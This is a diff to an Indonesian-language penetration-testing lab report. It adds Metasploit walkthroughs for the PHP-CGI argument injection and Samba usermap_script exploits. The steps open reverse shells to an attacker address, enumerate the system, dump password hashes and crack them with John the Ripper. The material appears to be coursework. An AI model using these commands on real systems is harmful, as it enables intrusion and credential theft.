@@ -28,6 +28,8 @@ Nmap (atau "Network Mapper") adalah sebuah program open source yang berguna untu
 
 ### *OpenVAS*
 
+### *John de Ripper*
+
 
 ---
 
@@ -85,11 +87,40 @@ Nmap (atau "Network Mapper") adalah sebuah program open source yang berguna untu
 
 ## Penetration Testing
 
-### Exploit : php_cgi_arg_injection, Post Exploitation :
+### Exploit : php_cgi_arg_injection, Post Exploitation : enum_system
+1. Penjelasan exploit php_cgi_arg_injection dapat dilihat pada [https://pentesterlab.com/exercises/cve-2012-1823/course]
+2. Vulnerability yang akan kita coba bobol kali ini akan menggunakan exploit yaitu php_cgi_arg_injection. Setelah membuka msfconsole, kita dapat memasukkan perintah `use exploit/multi/http/php_cgi_arg_injection`.
+3. Masukkan IP alamat target yang akan diserang dengan memasukkan `set RHOST [IP_TARGET]`.
+4. Payload yang akan kita gunakan adalah reverse_tcp, `set PAYLOAD php/meterpreter/reverse_tcp`.
+5. Masukkan IP alamat penyerang, `set LHOST [IP_ATTACKER]`.
+6. Untuk melihat status dapat dilakukan dengan `show options`.
+7. Setelah kita masuk di meterpreter, kita dapa melihat list file dengan memasukkan `ls`.
+8. Untuk mengetahui id/username dari session kita, masukkan `getuid`.
+9. Untuk mendapatkan informasi dari komputer, masukkan `sysinfo`.
+10. Untuk melakukan Post Exploitation, tekan ctrl+Z dan pilih `y`.
+11. Post Exploitation yang akan kita jalankan adalah enum_system, yaitu untuk mendapatkan informasi dari sistem target. Masukkan `use post/linux/gather/enum_system`.
+12. Set session sesuai ID session yang terbuka, `set SESSION [SESSION_ID]`.
+13. Jalankan exploit dengan perintah `run`. Maka akan mendapatkan info seperti di bawah ini (karena session yang terbuka bukanlah root, jadi yang bisa kita dapatkan hanya sebatas informasi-informasi seperti OS).
 
-### Exploit : usermap_script, Post Exploitation :
+### Exploit : usermap_script, Post Exploitation : hashdump
+1. Vulnerability kedua yang akan kita coba bobol kali ini akan menggunakan exploit usermap_script (SAMBA). Masukkan perintah `use exploit/multi/samba/usermap_script`.
+2. Masukkan `show payloads` untuk melihat payload apa saja yang dapat kita gunakan.
+3. Payload yang akan kita gunakan adalah `cmd/unix/reverse`.
+4. Masukkan perintah `set PAYLOAD cmd/unix/reverse`.
+5. Masukkan IP target dengan `set RHOST [IP_TARGET]`.
+6. Masukkan port target yang akan kita buka, `set RPORT 445`.
+7. Masukkan IP penyerang dengan `set LHOST [IP_ATTACKER]`.
+8. Jalankan exploit dengan `exploit`.
+9. Jika sudah kita jalankan dan berhasil, tandanya seperti di bawah ini.
+10. Berikut ini contoh-contoh perintah yang dapat kita masukkan.
+11. Tekan ctrl+Z dan pilih `y`.
+12. Untuk melihat daftar session yang terbuka dapat kita lakukan dengan `sessions -l`.
+13. Kali ini kita akan melakukan Post Exploitation yang bernama hashdump untuk mendapatkan database. Masukkan perintah `use post/linux/gather/hashdump`.
+14. Set session yang terbuka, `set SESSION [ID_SESSION]`.
+15. Jalankan exploit dengan memasukkan `exploit`.
+16. Databse berupa usernam password yang berhasil kita dapatkan telah di enkripsi. Untuk itu kita perlu melakukan *dictionary attack* dengan bantuan tool lain yaitu *John de Ripper*. Pertama masuklah ke direktori `/usr/sbin`. Jalan kan file john ddengan perintah `./john [ALAMAT_FILE_DUMP]`.
 
-### Exploit : vsftpd_234_backdoor, Post Exploitation : 
+### Exploit : vsftpd_234_backdoor, Post Exploitation : enum_configs
 
 
 ## Kesimpulan dan Saran
